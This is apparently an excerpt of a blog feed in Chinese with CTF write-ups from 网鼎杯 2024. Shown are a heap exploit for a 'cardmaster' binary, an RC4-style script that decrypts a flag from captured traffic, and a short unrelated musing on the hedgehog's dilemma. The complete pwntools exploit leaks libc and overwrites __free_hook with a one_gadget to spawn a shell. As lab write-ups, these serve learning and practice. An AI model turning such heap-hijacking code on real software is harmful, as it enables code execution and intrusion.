class="number">4</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce0fdcebc.png" alt="image-20241129121845198"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">init()<span class="comment">#init是为了让花色初始化，好进行下一次malloc</span></span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>))<span class="comment">#第一次申请，将_free_hook地址转移到可写的堆块上</span></span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">edit(<span class="number">4</span>,p64(one_gadget)) <span class="comment"># free函数劫持</span></span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce1020bf4.png" alt="image-20241129122442573"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#执行</span></span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>完整expoit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;cardmaster&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;nt:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;l:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">count,cnt</span>):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(count))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;13&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">init()</span><br><span class="line">free()</span><br><span class="line">pause()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;set:&quot;</span>)</span><br><span class="line">base = u64(p.recvuntil(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc.address = base</span><br><span class="line">one_gadget = <span class="number">0x4f322</span> + base</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">edit(<span class="number">4</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">init()</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>))</span><br><span class="line">init()</span><br><span class="line">edit(<span class="number">4</span>,p64(one_gadget))</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce1018bcc.png" alt="image-20241129123219218"></p><p>拿到shell</p>]]></content>
      
      
      <categories>
          
          <category> 赛后复盘 </category>
          
          <category> 网鼎杯2024 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2024半决赛数据逆向</title>
      <link href="/2024/11/24/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%95%B0%E6%8D%AE%E9%80%86%E5%90%91/"/>
      <url>/2024/11/24/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%95%B0%E6%8D%AE%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h2 id="数据逆向"><a href="#数据逆向" class="headerlink" title="数据逆向"></a>数据逆向</h2><p>本题是考察流量和逆向的共同分析，开始给了三个附件</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe7191ff.png" alt="image-20241124215855987.png" title="1"></p><p>查看后分别可以明白这三个文件的作用</p><ul><li>traffic.pcap :流量包，经过下面两个软件通信得到的流量</li><li>ser：server服务器端，elf文件</li><li>cli：客户端，elf文件</li></ul><h3 id="主要逻辑"><a href="#主要逻辑" class="headerlink" title="主要逻辑"></a>主要逻辑</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe89e2c8.png" alt="image-20241124220512861.png" title="2"></p><h3 id="sub-1825"><a href="#sub-1825" class="headerlink" title="sub_1825"></a>sub_1825</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe7ea9f4.png" alt="image-20241124220824963.png" title="3"></p><h3 id="sub-1552"><a href="#sub-1552" class="headerlink" title="sub_1552"></a>sub_1552</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe8351d3.png" alt="image-20241124221146889.png" title="4"></p><p>只看server的话，我们就应该去看流量包，找到发出一个key并返回right的流量，之后发送token</p><h3 id="traffic-pcap"><a href="#traffic-pcap" class="headerlink" title="traffic.pcap"></a>traffic.pcap</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe908f71.png" alt="image-20241124221607754.png" title="4"></p><p>跟踪到这段流量，但是会发现只有key正确但是没有正确的请求返回解密的包，所以我们需要自己使用它的key来给流量解密</p><p><strong>PS：</strong> 密码的wireshark！！为什么要在这加空格！！？？？加空格也就罢了，你还能复制上！！！！！因为空格浪费了近一小时（）</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe74b419.png" alt="image-20241124221857096.png" title="5"></p><h3 id="解密脚本（注意端序）"><a href="#解密脚本（注意端序）" class="headerlink" title="解密脚本（注意端序）"></a>解密脚本（注意端序）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> message[] = &#123; <span class="number">0xD1</span>,<span class="number">0x37</span>,<span class="number">0xd9</span>,<span class="number">0x5b</span>,<span class="number">0xf0</span>,<span class="number">0xA2</span>,<span class="number">0x32</span>,<span class="number">0xC6</span>,<span class="number">0x30</span>,<span class="number">0xA7</span>,<span class="number">0x8C</span>,<span class="number">0x50</span>,<span class="number">0x7E</span>,<span class="number">0x3E</span>,<span class="number">0xA7</span>,<span class="number">0x3A</span>,<span class="number">0xBA</span>,<span class="number">0xC0</span>,<span class="number">0x58</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0x85</span>,<span class="number">0x6b</span>,<span class="number">0x1c</span>,</span><br><span class="line"><span class="number">0x4c</span>,<span class="number">0xf5</span>,<span class="number">0x80</span>,<span class="number">0x7c</span>,<span class="number">0x8a</span>,<span class="number">0xC1</span>,<span class="number">0x42</span>,<span class="number">0x97</span>,<span class="number">0x90</span>,<span class="number">0xc7</span>&#125;;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">264</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> v3 = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> v7 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v11 = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> v6 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v10 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v12 = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">encryption</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf,<span class="type">char</span>* message,<span class="type">int</span> length)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i)</span><br><span class="line">v14[i] = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">0xFF</span>; ++j) &#123;</span><br><span class="line">v3 = v14[j] + v11;</span><br><span class="line">v11 = (<span class="type">unsigned</span> __int8)(v3 + buf[j % <span class="built_in">strlen</span>(buf)]);</span><br><span class="line">v6 = v14[j];</span><br><span class="line">v14[j] = v14[v11];</span><br><span class="line">v14[v11] = v6;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; length; ++k) &#123;</span><br><span class="line">v10 = (<span class="type">unsigned</span> __int8)(v10 + <span class="number">1</span>);</span><br><span class="line">v12 = (<span class="type">unsigned</span> __int8)(v14[v10] + v12);</span><br><span class="line">v7 = v14[v10];</span><br><span class="line">v14[v10] = v14[v12];</span><br><span class="line">v14[v12] = v7;</span><br><span class="line">*(<span class="type">char</span>*)(message + k) ^= v14[(<span class="type">unsigned</span> __int8)(v14[v10] + v14[v12])] ^<span class="number">0x25</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">encryption</span>(<span class="string">&quot;WangDingCUPKEY!!&quot;</span>, message, <span class="number">0x22</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, message[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cli"><a href="#cli" class="headerlink" title="cli"></a>cli</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe897250.png" alt="image-20241124222440602.png" title="6"></p><h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>直接在本地里启动服务，然后把keyword发送一下，然后就可以看到flag回显过来了……</p>]]></content>
      
      
      <categories>
          
          <category> 赛后复盘 </category>
          
          <category> 网鼎杯2024 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A-T-Field-豪猪两难</title>
      <link href="/2024/07/04/A-T-Field-%E8%B1%AA%E7%8C%AA%E4%B8%A4%E9%9A%BE/"/>
      <url>/2024/07/04/A-T-Field-%E8%B1%AA%E7%8C%AA%E4%B8%A4%E9%9A%BE/</url>
      
        <content type="html"><![CDATA[<p><img src="https://www.helloimg.com/i/2024/11/29/6749ce102d95b.png" alt="2.png" title="1043"></p><p>豪猪的身上有刺，当<strong>豪猪想要靠近为他人提供暖的时候身上的刺却又会不情愿的刺到对方</strong>。 套用在人身上，似乎也是如此。所谓成为大人,就是在反复的接近和远离中找到互不伤害对方的距离。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内心 </tag>
            
            <tag> 哲学 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
